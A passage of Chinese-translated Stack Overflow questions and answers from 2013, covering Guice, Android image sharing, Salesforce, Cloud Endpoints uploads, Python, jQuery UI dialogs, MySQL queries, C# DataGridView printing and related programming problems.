class MyGuiceApp{
  @Inject
  private MyGuiceFactory factory;

  private SequenceGenerator sequenceGenerator

  @Inject
  public MyGuiceApp(SequenceGenerator generator){
    sequenceGenerator = generator;
  }

  public ItemID getNextItemID(){
    return sequenceGenerator.generateNextSequenceID(ItemID.class);
  }

  public <I extends Item> I createItem(Class<I> type){
    return (I)factory.createItem(type, getNextItemID());
  }
} 
```

由于 Guice 不能使用通用静态类型作为键，它不知道要构建什么。因为我不能将它绑定到任何特定的东西，或者要求它绑定到任何特定的东西

我被卡住无法用 guice 构建它。但是我有一些 AOP 代码需要由 guice 创建。

如果我能够从我的应用程序创建子类型，那么这些子类型可以参与我的托管游戏状态 aop 层。

任何建议都会有很大帮助。

任何关于改写问题的建议也将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-08T19:42:42.047

如您所见，您的游戏本身就是一个自制的 ioc 容器。据我了解，在某处你有

```
class AClass
{
  @Inject private Game game;
  void method() {
    Weapon weapon = game.createItem(AK47.class);
    weapon.shoot();
  }
} 
```

我使用 Provider 的意思是：

```
class AClass
{ 
  @Inject private Provider<AK47> ak47Provider;
  void method() {
    Weapon weapon = ak47Provider.get();
    weapon.shoot();
  }
} 
```

当您只需要配置注入器模块以绑定应用程序中可能拥有的所有提供程序时。

如果您将 an`Injector`注入到游戏中并将其用作对象工厂，则可以实现相同的效果：

```
class GameBase
{
  @Inject private Injector injector;
  public <I extends Item> I createItem(Class<I> itemType){
    return injector.getInstance(itemType);
  }
} 
```

你看到它`com.google.inject.Injector#getInstance`的签名和你的完全一样`createItem`吗？

但我更喜欢第一个变体，它看起来更干净并减少了依赖关系。

# android - 如何将可绘制对象的资源 ID 从我的应用程序返回到不同包/开发人员的调用应用程序

> ID：15879859
> 
> 赞同：1
> 
> 时间：2013-04-08T13:05:38.697
> 
> 标签：android, image, android-intent, gallery, default

我正在构建一个包含大量图像的应用程序，以用作使用图像共享选项的任何聊天客户端的替代图标。

编辑：我想出了如何从另一个应用程序（不是我的应用程序）启动我的应用程序，以便现在我可以在默认图库或我的应用程序之间进行选择以选择图像。

剩下的就是我需要知道图片库返回给调用它进行图像挑选的应用程序的确切内容，以便我可以从我的应用程序返回相同的东西。

编辑 3：我现在将 Intent 传递回聊天客户端

```
Uri imageURI;
    Intent shareIntent = new Intent();
    switch(v.getId()){
    case R.id.eric1 :
        imageURI = Uri.parse(MY_RESOURCE_URI);
        shareIntent.putExtra(Intent.EXTRA_STREAM, imageURI);
        shareIntent.setType("image/plain");
        setResult(RESULT_OK, shareIntent);
        Utils.makeToast("Selected",this);
        finish(); 
```

现在我收到一个共享文件失败的错误。是因为我试图将资源 URI 从我的包传递到另一个包吗？

编辑-终于以这种方式解决了

```
Bitmap image = BitmapFactory.decodeResource(getResources(), resID);
        File imageFile;
        Date d = new Date();
        int imgName = (Long.toString(d.getTime())).hashCode();
        String state = Environment.getExternalStorageState();
        printDebug(state);
        if (Environment.MEDIA_MOUNTED.equals(state)) {
            File file = getExternalCacheDir();
            if (file != null) {
                try {
                    //String root = file.getAbsolutePath();
                    imageFile = new File(file, imgName+".png");
                    printDebug(imageFile.getAbsolutePath());
                    FileOutputStream stream = new FileOutputStream(imageFile);
                    boolean complete = image.compress(Bitmap.CompressFormat.PNG, 90, stream);
                    if (!complete) {
                        Log.d("tag", "image not saved");
                    }
                    Log.d("tag", "image saved");
                    return Uri.parse(imageFile.getAbsolutePath());
                } catch (IOException e) {
                    Log.d("tag", "Can't save image", e);
                }
            }
        }
        return null;
        } 
```

谢谢您的帮助

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-03-31T19:13:27.290

抱歉，我忘记将其发布为答案，但在这里-

```
Bitmap image = BitmapFactory.decodeResource(getResources(), resID);
    File imageFile;
    Date d = new Date();
    int imgName = (Long.toString(d.getTime())).hashCode();
    String state = Environment.getExternalStorageState();
    printDebug(state);
    if (Environment.MEDIA_MOUNTED.equals(state)) {
        File file = getExternalCacheDir();
        if (file != null) {
            try {
                //String root = file.getAbsolutePath();
                imageFile = new File(file, imgName+".png");
                printDebug(imageFile.getAbsolutePath());
                FileOutputStream stream = new FileOutputStream(imageFile);
                boolean complete = image.compress(Bitmap.CompressFormat.PNG, 90, stream);
                if (!complete) {
                    Log.d("tag", "image not saved");
                }
                Log.d("tag", "image saved");
                return Uri.parse(imageFile.getAbsolutePath());
            } catch (IOException e) {
                Log.d("tag", "Can't save image", e);
            }
        }
    }
    return null;
    } 
```

# windows-phone-7 - UNKNOWN_EXCEPTION：目标网址未重置。登录返回的 URL 必须在 Salesforce 中设置

> ID：15879864
> 
> 赞同：1
> 
> 时间：2013-04-08T13:06:07.320
> 
> 标签：windows-phone-7, salesforce, service-reference

在 Windows Phone 应用程序中，我添加了 Enterprise.wsdl（从我的 salesforce 登录 ID 获得）作为参考。我可以使用 Loginresult 进行身份验证。但是在使用 Create 时会抛出上述开销。

在 Web 应用程序中使用 SoapHeader 类继承 System.Web.Services.Protocols.SoapHeader 所以引用了服务器 url 和 id。无法在 Windows phone 中使用网络。如果您知道任何解决问题的样本，请帮助

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-08T15:18:30.413

登录调用的部分结果是 serverUrl，此 url 应该用于发出所有后续请求，通常在 .NET 中，您只需将存根的 .Url 属性设置为提供的值。虽然没有特定于 win-phone 的示例，但[文档中有很多 .NET 示例](http://www.salesforce.com/us/developer/docs/api/index.htm)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-09T07:47:17.153

My experience has been that you can't import the Partner or Enterprise WSDLs to a Windows Phone 7 project.

With Windows Phone 7 projects you can add a Service Reference (for WCF), but not a Web Reference.

Whenever I've imported the Salesforce WSDLs to a standard .NET project I've needed to use a Web Reference to get the APIs working correctly. Something about how WCF doesn't support the Salesforce WSDL defined SOAP headers that are needed to specify the session details.

I found using the [REST API](http://www.salesforce.com/us/developer/docs/api_rest/) and [JSON.NET](http://json.codeplex.com/) to be the easiest with Windows Phone 7 projects.

That said, my phone app only works with Developer, Enterprise and Unlimited Salesforce editions. Professional and Group editions get the API_DISABLED_FOR_ORG error. I think I need to get the app certified to work with those editions.

# javascript - 将文件从 Javascript 上传到 Google Cloud Endpoint

> ID：15879865
> 
> 赞同：6
> 
> 时间：2013-04-08T13:06:12.333
> 
> 标签：javascript, jquery, google-app-engine, google-cloud-endpoints

我正在创建一个仅使用**HTML5** + **Javascript** + **jQueryMobile**的网络应用程序，并且我想使用同样由我创建的**Google Cloud Endpoint**将文件上传到**Google App Engine**网络应用程序。

 **当我控制双方时，我可以（并且想要）创建尽可能简单的交互。

至于端点，我想创建一个这样的方法：

```
@ApiMethod(
  name = "uploadFile",
  path = "upload_file",
  httpMethod = HttpMethod.POST
)
public void uploadFile(File file) {
  //process the file
} 
```

此类`File`可以包含`fileData`Blob 类型的字段，或 byte[] 或类似的字段，代表文件数据......类似于：

```
public class File {    
  private String fileName;
  private long fileSize;
  private Blob fileData;    
  //getters and setters
} 
```

所以第一个问题是：**这个领域最适合的类型是** `fileData`**什么？**

并且，考虑到为该字段选择的类型，**我如何为该端点方法创建必要的 POST 请求形式 Javascript/jQuery？**

基本上我需要创建一个 POST 请求来在 POST 数据中`http://myappid.appspot.com/_ah/api/files/v1/upload_file`添加`File`对象。

*注意：对不起，我没有尝试过任何 Javascript 代码，因为我对这项技术一点也不熟悉，所以我很感激任何帮助......*

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T11:09:41.827

编辑：下面的答案针对 AppEngine 的 python 版本

这是一个普遍的需求，没有明确的解决方案。到目前为止，[gae-init-upload](http://upload.gae-init.appspot.com/)演示了如何使用 AppEngine 和 CoffeeScript 实现这一目标。值得一看，CoffeeScript 正在被编译成 JavaScript，以防你不熟悉。

您正在寻找的 JavaScript 解决方案位于

`/main/static/src/coffee/common/upload.coffee`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-03-13T22:23:39.303

我最终在我的 AMD Javascript 应用程序中使用了这段代码。对不起，我不能解释太多，因为自从我写了这个项目以来，我已经写了很多代码，而且正如你所看到的，我没有正确地注释代码（**失败！！**），无论如何，也许你可以得到一些想法...

请注意，获取导航器位置有些问题，因为我想存储文件上传的位置，但根本没有必要！

### 控制器.js

```
 uploadFile: function(request, render) {
        var self = this;
        var file = $("#file").get(0).files[0];

        var reader = new FileReader();            
        reader.onload = function (evt) { 
            var upload = {
                provider: self.folder.provider,
                folderIdentifier: self.folder.id,
                fileName: file.name,
                fileSize: file.size,
                base64Data: btoa(evt.target.result),
                location: {
                    latitude: self.position.coords.latitude, 
                    longitude: self.position.coords.longitude
                }
            }                
            var uploadFilePromise = self.connector.uploadFile(self.sessionToken.token, upload);            
            uploadFilePromise.done(function (file) {
                render("file", {
                    result: "DONE",
                    file: file
                });
            });                
            uploadFilePromise.fail(function (error) {
                render("file", {
                    result: "FAIL"
                });
            });
        }

        navigator.geolocation.getCurrentPosition(function(position) {
            self.position = position;                
            reader.readAsBinaryString(file);
        });
    } 
```

### 连接器.js

```
 uploadFile: function (sessionToken, upload) {
        var self = this;
        var promise = new Promise();

        gapi.client.load('upload', 'v1', function() {
            var request = gapi.client.upload.uploadFile({
                session_token: sessionToken, 
                resource: upload
            });
            request.execute(function(response) {
                if (response.error) {
                    promise.reject(response.error);
                }
                else {
                    var file = File.create(response.result.provider,
                                           response.result.type, 
                                           response.result.identifier, 
                                           response.result.name,
                                           response.result.description,                                               
                                           response.result.created,
                                           response.result.size,
                                           response.result.link,
                                           {
                                               latitude: response.result.location.latitude,
                                               longitude: response.result.location.longitude
                                           });
                    promise.resolve(file);
                }
            });
        }, self.api);

        return promise;
    } 
```

### 端点.java

```
@Api(name="upload")
public class UploadEndpoint {

    @ApiMethod(
        name = "uploadFile",
        path = "upload_file",
        httpMethod = HttpMethod.POST
    )
    public File uploadFile (
            @Named("session_token") String token, 
            Upload upload) throws InternalServerErrorException {

        File file = new UploadController().uploadFile(token, upload);
        return file;
    }

} 
```**

# python-3.x - TypeError: object.__new__() 使用生成器时不带参数

> ID：15879866
> 
> 赞同：0
> 
> 时间：2013-04-08T13:06:12.927
> 
> 标签：python-3.x

我是python的新手。我需要打印从1到100的所有数字。当我运行这段代码时，我得到了这个错误

```
Traceback (most recent call last):
File "C:\Eclipse\workspace\firstpython\src\oopsegmant.py", line 14, in <module>
 p = Prime(1)
TypeError: object.__new__() takes no parameters 
```

程序是这样的

```
class Prime():
    def _init_(self,i):
        self.i=i

def print_value(self):          
    while(True):
        yield(self.i)
        self.i+=self.i
p = Prime(1)
for numb in p.print_value():
    if(numb>100):
       break
    print(numb) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-08T13:07:38.853

`_init_`应该用双下划线拼写，`__init__`.

所有特殊方法名称都用双下划线括起来。

此外，该`print_value`方法应缩进`class`成为它的一部分。

# jquery-ui - jquery ui对话框如何检测失去焦点

> ID：15879869
> 
> 赞同：1
> 
> 时间：2013-04-08T13:06:18.787
> 
> 标签：jquery-ui, dialog, focus, jquery-ui-dialog, lost-focus

我一直在寻找很长一段时间没有成功。我想检测特定的 jquery ui 对话框何时失去焦点。我知道我可以像这样检测到它何时获得焦点：

```
focus: function(event, ui) { console.log('focus in: '+this.id); } 
```

但是，我尝试过的任何方式都不会触发 focusout 事件：

```
focusout: function(event, ui) { console.log('focus out: '+this.id);} 
```

这是我的（PHP 回显）代码：

```
<script type=\"text/javascript\">
$(\"".$element."\").click(function(e){
    $(\"#".$divname."\").load('".$url."').dialog({
    title: '".$title."',
    modal:".$modal.", 
    resizable: true, 
    width:'".$width."', 
    height:'".$height."', 
    show: 'clip',
    hide: 'clip',
    open: function(event, ui) {\$(\".ui-widget-overlay\").css({'background-image': 'url(\"../css/stripe_small.png\")','background-repeat':'repeat', 'opacity':'0.8'})},
    minimize: '#toolbar',
    focus: function(event, ui) { console.log('focus in: '+this.id); },
    focusout: function(event, ui) { console.log('focus out: '+this.id);}});
    });
</script>
<div id=\"".$divname."\"></div>"; 
```

一切正常，除了焦点外检测。有没有办法做到这一点，或者我必须迭代所有窗口元素来找出哪个有焦点？

编辑：或者，我想知道是否可以找到哪个 UI 对话框是前面的那个。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-11T17:05:45.970

由于没有人回答，我将简要回答我的想法。jQuery 的**blur**和**focusout**似乎不会触发我的对话框：

尝试侦听对话框小部件的事件时：

```
$(".ui-dialog.ui-widget.ui-widget-content.ui-corner-all.ui-draggable.ui-resizable").blur(function({ //NOP }); 
```

尝试侦听用于对话框的 divname 的事件时：

```
$("#divname").blur( function({ //NOP }); 
```

不要被触发。奇怪的是，**focusin**确实有效：

```
$("#divname").focusin( function({ console.log('focused in'); }); 
```

一个骇人听闻的解决方案（如果页面上有很多 ui-dialogs 可能会有点重，因为在我的情况下发生了这种情况，但它仍然有效，是侦听 ui-dialogs 上的点击事件：

```
$(".ui-dialog.ui-widget.ui-widget-content.ui-corner-all.ui-draggable.ui-resizable").live('click',function(){
  $(this).addClass('ui-active').removeClass('ui-inactive');
}); 
```

这完全相反：不是试图检测失去焦点的对话框，而是 onclick 我迭代所有对话框。ZIndex 最高的位于顶部，其余的则不在（因此失去焦点）：

```
var topZindex = 0;
$(".ui-dialog.ui-widget.ui-widget-content.ui-corner-all.ui-draggable.ui-resizable").each( function( ){
  var thisZindex = parseInt($(this).css('zIndex'), 10);
  if ( thisZindex > topZindex ) topZindex = thisZindex;
}); 
```

如果在整个 ui-dialog 失去焦点时会以某种方式触发回调，那就太好了，但我似乎无法在网络上找到另一个解决方案，而且我无法触发 blur 或 focusout。

# java - Android：使用 XmlPullParser 的内容编写文件

> ID：15879870
> 
> 赞同：0
> 
> 时间：2013-04-08T13:06:20.870
> 
> 标签：java, android

我有来自解析器的以下文件：

```
Resources res = getResources();
XmlResourceParser parser = res.getXml(R.xml.textvalues); 
```

我想将其内容复制到我的私人存储中以便能够使用它，我想这样做：

```
String FILENAME = "hello_file";
String string = parser.ToString();

FileOutputStream fos = openFileOutput(FILENAME, Context.MODE_PRIVATE);
fos.write(string.getBytes());
fos.close(); 
```

但是 parser.ToString 不返回 XML 内容。我真的需要遍历整个解析器并使用 StringBuilder 来获取我的 XML 吗？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T07:27:44.723

使用 Assets 文件夹（我以前不知道，谢谢@blackbelt）我可以放置任何类型的文件并不受限制地访问它。之后，我可以将其内容复制到我的私人文件夹中并使用该文件。

# stanford-nlp - 如何在斯坦福 API 中定义 SemgrexPattern，以匹配节点的文本而不使用 {lemma:...}？

> ID：15879873
> 
> 赞同：0
> 
> 时间：2013-04-08T13:06:29.573
> 
> 标签：stanford-nlp

我正在使用 edu.stanford.nlp.semgrex 和 edu.stanford.nlp.tress.semgraph 包，并正在寻找一种方法来匹配具有除 lemma: 指令之外的文本值的节点。

我无法在 javadoc 中为 SemgrexPattern 找到所有可能的属性名称，只有那些用于引理、标记和关系运算符的属性名称 - 是否有可用的完整列表？

例如，在以下句子中，我的实得工资是 20 美元。

无法使用提取“带回家”节点

```
(SemgrexPattern.compile( "{lemma:take-home}"))
.matcher( "My take-home pay is $20.").find() 
```

产生 false，因为 take-home 被认为不是引理。

我需要做什么才能将节点与非引理任意文本匹配？

感谢您的任何建议或评论。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T13:17:21.483

抱歉 - 我意识到这`{word:take-home}`在上面的示例中有效。

谢谢..

# c++ - 控制台宽度；假设违约或成为……？

> ID：15879879
> 
> 赞同：0
> 
> 时间：2013-04-08T13:06:43.680
> 
> 标签：c++, cin

从控制台读取输入

```
if(std::cin){
    decision = std::cin.get();

    if(std::cin.eof())
        throw CustomException("Error occurred while reading input\n");
}else{
    throw CustomException("Error occurred while reading input\n");
} 
```

清除流上的剩余输入

```
std::cin.ignore(COL_WIDTH, '\n'); // skip bad input 
```

`COL_WIDTH`是 80 通过[为什么默认终端宽度是 80 个字符来确定？](https://stackoverflow.com/questions/4651012/why-is-the-default-terminal-width-80-characters). 我应该假设一个 80 个字符的控制台宽度还是一个任意更大的数字更适合`cin.ignore`？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-08T13:08:52.000

您可以输入多行字符，即使是 80 个字符。
请改用`std::numeric_limits<std::streamsize>::max()`。

# c# - 在 Report.rdlc 中显示数据

> ID：15879880
> 
> 赞同：-1
> 
> 时间：2013-04-08T13:06:48.807
> 
> 标签：c#

我必须在 Report.rdlc 中显示来自 DataGridView 的数据。我创建了所有内容，但是当我单击按钮（ShowReport）时仅显示标题，而不是 DataGridView 中的数据，我的数据是![在此处输入图像描述](https://i.stack.imgur.com/DNNnr.png)

但显示这个：

![在此处输入图像描述](https://i.stack.imgur.com/mWaUx.png)

我使用此代码调用 Report ：

```
PrintForm pf = new PrintForm();
pf.ShowDialog(); 
```

什么是问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-08T13:21:04.790

我以前测试这个类打印数据网格视图内容。而不是使用`Report.rdlc`尝试这段代码

将此类添加到您的项目中：

**已编辑**

```
 class ClsPrint
    {
        #region Variables

        int iCellHeight = 0; //Used to get/set the datagridview cell height
        int iTotalWidth = 0; //
        int iRow = 0;//Used as counter
        bool bFirstPage = false; //Used to check whether we are printing first page
        bool bNewPage = false;// Used to check whether we are printing a new page
        int iHeaderHeight = 0; //Used for the header height
        StringFormat strFormat; //Used to format the grid rows.
        ArrayList arrColumnLefts = new ArrayList();//Used to save left coordinates of columns
        ArrayList arrColumnWidths = new ArrayList();//Used to save column widths
        private PrintDocument _printDocument = new PrintDocument();
        private DataGridView gw = new DataGridView();
        private string _ReportHeader;

        #endregion

        public ClsPrint(DataGridView gridview, string ReportHeader)
        {
            _printDocument.PrintPage += new PrintPageEventHandler(_printDocument_PrintPage);
            _printDocument.BeginPrint += new PrintEventHandler(_printDocument_BeginPrint);
            gw = gridview;
            _ReportHeader = ReportHeader;
        }

        public void PrintForm()
        {
            ////Open the print dialog
            //PrintDialog printDialog = new PrintDialog();
            //printDialog.Document = _printDocument;
            //printDialog.UseEXDialog = true;

            ////Get the document
            //if (DialogResult.OK == printDialog.ShowDialog())
            //{
            //    _printDocument.DocumentName = "Test Page Print";
            //    _printDocument.Print();
            //}

            //Open the print preview dialog
            PrintPreviewDialog objPPdialog = new PrintPreviewDialog();
            objPPdialog.Document = _printDocument;
            objPPdialog.ShowDialog();
        }

        private void _printDocument_PrintPage(object sender, System.Drawing.Printing.PrintPageEventArgs e)
        {
            //try
            //{
            //Set the left margin
            int iLeftMargin = e.MarginBounds.Left;
            //Set the top margin
            int iTopMargin = e.MarginBounds.Top;
            //Whether more pages have to print or not
            bool bMorePagesToPrint = false;
            int iTmpWidth = 0;

            //For the first page to print set the cell width and header height
            if (bFirstPage)
            {
                foreach (DataGridViewColumn GridCol in gw.Columns)
                {
                    iTmpWidth = (int)(Math.Floor((double)((double)GridCol.Width /
                        (double)iTotalWidth * (double)iTotalWidth *
                        ((double)e.MarginBounds.Width / (double)iTotalWidth))));

                    iHeaderHeight = (int)(e.Graphics.MeasureString(GridCol.HeaderText,
                        GridCol.InheritedStyle.Font, iTmpWidth).Height) + 11;

                    // Save width and height of headers
                    arrColumnLefts.Add(iLeftMargin);
                    arrColumnWidths.Add(iTmpWidth);
                    iLeftMargin += iTmpWidth;
                }
            }
            //Loop till all the grid rows not get printed
            while (iRow <= gw.Rows.Count - 1)
            {
                DataGridViewRow GridRow = gw.Rows[iRow];
                //Set the cell height
                iCellHeight = GridRow.Height + 5;
                int iCount = 0;
                //Check whether the current page settings allows more rows to print
                if (iTopMargin + iCellHeight >= e.MarginBounds.Height + e.MarginBounds.Top)
                {
                    bNewPage = true;
                    bFirstPage = false;
                    bMorePagesToPrint = true;
                    break;
                }
                else
                {

                    if (bNewPage)
                    {
                        //Draw Header
                        e.Graphics.DrawString(_ReportHeader,
                            new Font(gw.Font, FontStyle.Bold),
                            Brushes.Black, e.MarginBounds.Left,
                            e.MarginBounds.Top - e.Graphics.MeasureString(_ReportHeader,
                            new Font(gw.Font, FontStyle.Bold),
                            e.MarginBounds.Width).Height - 13);

                        String strDate = "";
                        //Draw Date
                        e.Graphics.DrawString(strDate,
                            new Font(gw.Font, FontStyle.Bold), Brushes.Black,
                            e.MarginBounds.Left +
                            (e.MarginBounds.Width - e.Graphics.MeasureString(strDate,
                            new Font(gw.Font, FontStyle.Bold),
                            e.MarginBounds.Width).Width),
                            e.MarginBounds.Top - e.Graphics.MeasureString(_ReportHeader,
                            new Font(new Font(gw.Font, FontStyle.Bold),
                            FontStyle.Bold), e.MarginBounds.Width).Height - 13);

                        //Draw Columns                 
                        iTopMargin = e.MarginBounds.Top;
                        DataGridViewColumn[] _GridCol = new DataGridViewColumn[gw.Columns.Count];
                        int colcount = 0;
                        //Convert ltr to rtl
                        foreach (DataGridViewColumn GridCol in gw.Columns)
                        {
                            _GridCol[colcount++] = GridCol;
                        }
                        for (int i = (_GridCol.Count() - 1); i >= 0; i--)
                        {
                            e.Graphics.FillRectangle(new SolidBrush(Color.LightGray),
                                new Rectangle((int)arrColumnLefts[iCount], iTopMargin,
                                (int)arrColumnWidths[iCount], iHeaderHeight));

                            e.Graphics.DrawRectangle(Pens.Black,
                                new Rectangle((int)arrColumnLefts[iCount], iTopMargin,
                                (int)arrColumnWidths[iCount], iHeaderHeight));

                            e.Graphics.DrawString(_GridCol[i].HeaderText,
                                _GridCol[i].InheritedStyle.Font,
                                new SolidBrush(_GridCol[i].InheritedStyle.ForeColor),
                                new RectangleF((int)arrColumnLefts[iCount], iTopMargin,
                                (int)arrColumnWidths[iCount], iHeaderHeight), strFormat);
                            iCount++;
                        }
                        bNewPage = false;
                        iTopMargin += iHeaderHeight;
                    }
                    iCount = 0;
                    DataGridViewCell[] _GridCell = new DataGridViewCell[GridRow.Cells.Count];
                    int cellcount = 0;
                    //Convert ltr to rtl
                    foreach (DataGridViewCell Cel in GridRow.Cells)
                    {
                        _GridCell[cellcount++] = Cel;
                    }
                    //Draw Columns Contents                
                    for (int i = (_GridCell.Count() - 1); i >= 0; i--)
                    {
                        if (_GridCell[i].Value != null)
                        {
                            e.Graphics.DrawString(_GridCell[i].FormattedValue.ToString(),
                                _GridCell[i].InheritedStyle.Font,
                                new SolidBrush(_GridCell[i].InheritedStyle.ForeColor),
                                new RectangleF((int)arrColumnLefts[iCount],
                                (float)iTopMargin,
                                (int)arrColumnWidths[iCount], (float)iCellHeight),
                                strFormat);
                        }
                        //Drawing Cells Borders 
                        e.Graphics.DrawRectangle(Pens.Black,
                            new Rectangle((int)arrColumnLefts[iCount], iTopMargin,
                            (int)arrColumnWidths[iCount], iCellHeight));
                        iCount++;
                    }
                }
                iRow++;
                iTopMargin += iCellHeight;
            }
            //If more lines exist, print another page.
            if (bMorePagesToPrint)
                e.HasMorePages = true;
            else
                e.HasMorePages = false;
            //}
            //catch (Exception exc)
            //{
            //    MessageBox.Show(exc.Message, "Error", MessageBoxButtons.OK,
            //       MessageBoxIcon.Error);
            //}
        }

        private void _printDocument_BeginPrint(object sender, System.Drawing.Printing.PrintEventArgs e)
        {
            try
            {
                strFormat = new StringFormat();
                strFormat.Alignment = StringAlignment.Center;
                strFormat.LineAlignment = StringAlignment.Center;
                strFormat.Trimming = StringTrimming.EllipsisCharacter;

                arrColumnLefts.Clear();
                arrColumnWidths.Clear();
                iCellHeight = 0;
                iRow = 0;
                bFirstPage = true;
                bNewPage = true;

                // Calculating Total Widths
                iTotalWidth = 0;
                foreach (DataGridViewColumn dgvGridCol in gw.Columns)
                {
                    iTotalWidth += dgvGridCol.Width;
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

    } 
```

**使用：**这将显示带有网格视图结果的打印对话框

```
 ClsPrint _ClsPrint = new ClsPrint(dataGridView1, "header doc text");
 _ClsPrint.PrintForm(); 
```

## 结果

![在此处输入图像描述](https://i.stack.imgur.com/ZpZp4.png)

# php - mysql查询一次查询提取多条记录

> ID：15879882
> 
> 赞同：2
> 
> 时间：2013-04-08T13:06:53.133
> 
> 标签：php, mysql, sql

这是我的桌子

```
id | question | 
```

id 被分组为

```
1000 -> 1050
2000 -> 2030
3000 -> 3099
4000 -> 4500
5000 -> 5010 
```

我必须为每组 id 提取 5 条记录和一条。

如何仅使用一个查询来执行此操作？

非常感谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T13:26:20.963

```
SELECT *, IF (id > 1000 AND id < 1050, 1, 
          IF (id > 2000 AND id < 2030, 2,
          IF (id > 3000 AND id < 3099, 3,
          IF (id > 4000 AND id < 4500, 4,
          IF (id > 5000 AND id < 5010, 5, 0))))) AS param 
FROM questions WHERE param > 0 GROUP BY param 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-08T13:31:30.490

要做到这一点，只需一个查询（不使用[NedretRecap](https://stackoverflow.com/a/15880146/1149736)`UNION`建议的），您可以将（或类似的列）添加到您的表中并使用 simple 。`group_id``... GROUP BY group_id`

假设*保留的组大小*始终相同（某些组不可能从上一个开始，而其他组**不可能**从上开始），您可能可以使用这个简单的技巧：`+1000``+300`

```
SELECT id
FROM table
GROUP BY FLOOR(id/1000) 
```

[这里](http://sqlfiddle.com/#!2/17a44/3/0)的工作示例。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-08T13:19:02.617

```
SELECT f1, f2, ... FROM tablename WHERE id BETWEEN 1000 AND 1050 ORDER BY RAND() LIMIT 1
UNION
SELECTS f1, f2, ... FROM tablename WHERE id BETWEEN 2000 AND 2030 ORDER BY RAND() LIMIT 1
UNION
SELECTS f1, f2, ... FROM tablename WHERE id BETWEEN 2000 AND 2030 ORDER BY RAND() LIMIT 1 
```

还有两个用 UNION 选择

# mysql - 如何组合具有相同和不同列的 2 个表的行

> ID：15879888
> 
> 赞同：1
> 
> 时间：2013-04-08T13:07:14.933
> 
> 标签：mysql, sql, database-design, join, union-all

我有两个用于用户帖子的表，一个用于文本帖子，一个用于多媒体帖子，两个表的结构如下。

表**text_post**

```
+--------+--------------+-----------+-----------+-----------------+-----------+
| postid | post_content | post_user | post_type | post_visibility | post_date |
+--------+--------------+-----------+-----------+-----------------+-----------+ 
```

表**media_post**

```
+-------+------------+--------+---------+---------+---------------+---------+
|post_id|post_content|post_url|post_user|post_type|post_visibility|post_date|
+-------+------------+--------+---------+---------+---------------+---------+ 
```

在 text_post`post_content`中是用户发布的文本数据，在 media_post`post_content`中是与多媒体文件相关联的标题文本，因此基本上`post_content`是文本。所有列都是通用的，只有 post_url 在 media_post 中不同，我想将这两个表的结果组合如下

```
+-------+------------+--------+---------+---------+---------------+---------+
|post_id|post_content|post_url|post_user|post_type|post_visibility|post_date|
+-------+------------+--------+---------+---------+---------------+---------+
|  1    |  some text | null   | 1       | <type>  | <visibility>  | <date>  |
+-------+------------+--------+---------+---------+---------------+---------+
|  1    | img_caption| <url>  | 1       | <type>  | <visibility>  | <date>  |
+-------+------------+--------+---------+---------+---------------+---------+
..and so on 
```

这里返回的第一行来自`text_post`所以`post_url`设置为空，因为只有`multimedia_post`那一列......而第二行来自`multimedia_post`因为有帖子的网址......

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-08T13:12:05.623

您可以`UNION ALL`从两个`SELECT`返回“排列”列的 s 中，如下所示：

```
SELECT
    postid as post_id
,   post_content
,   null as post_url
,   post_user
... -- the rest of text_post columns included in the select
FROM text_post
UNION ALL
SELECT
    post_id
,   img_caption as post_content
,   post_url
,   post_user
... -- the rest of multimedia_post columns included in the select
FROM multimedia_post 
```

请注意如何`null as post_url`选择 from `text_post`：这是为了排列两个 select 语句的列所必需的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-08T13:13:45.377

使用联合

```
SELECT 
  postid, post_content, NULL, post_user, post_type, post_visibility, post_date 
FROM
  text_post
UNION
 SELECT 
  postid, post_content, post_url, post_user, post_type, post_visibility, post_date 
FROM
  multimedia_post 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-08T13:14:17.003

您必须在两个表上都使用完全外连接

```
 select post_id,post_content,post_url,post_user,post_type,post_visibility,
 post_date from 
 text_post as tp, multimedia_post as mp 
 on tp.post_id = mp.post_id 
```

# objective-c - 保留 NSLayoutConstraints 的常量

> ID：15879889
> 
> 赞同：1
> 
> 时间：2013-04-08T13:07:17.843
> 
> 标签：objective-c, macos, cocoa, nslayoutconstraint

在 Pre-NSLayoutConstraint 时代，这是可能的`NSWindow`：
[保留 NSWindow 大小和状态 - 寻找一种优雅的方式来做到这一点](https://stackoverflow.com/questions/3478185/retaining-an-nswindow-size-and-state-looking-for-an-elegant-way-to-do-this)

有没有办法`NSLayoutConstraint.constant`在应用程序退出时保存 s，并在启动时再次恢复它们？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T13:50:46.773

这可能有点远，但我认为您可以为此使用**NSCoding 。**

# task - 在android“Android-Universal-Image-Loader”中，如果ImageView被重用于另一个任务，为什么要取消当前任务

> ID：15879892
> 
> 赞同：1
> 
> 时间：2013-04-08T13:07:23.470
> 
> 标签：task, universal-image-loader

在LoadAndDisplayImageTask类中，有一个名为“checkTaskIsNotActual”的函数。并且有一个注释“如果ImageView被重用于另一个任务，那么当前任务应该被取消”。但我不知道他为什么这样做。找朋友如果知道原因，请告诉我答案。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-06-19T09:10:59.507

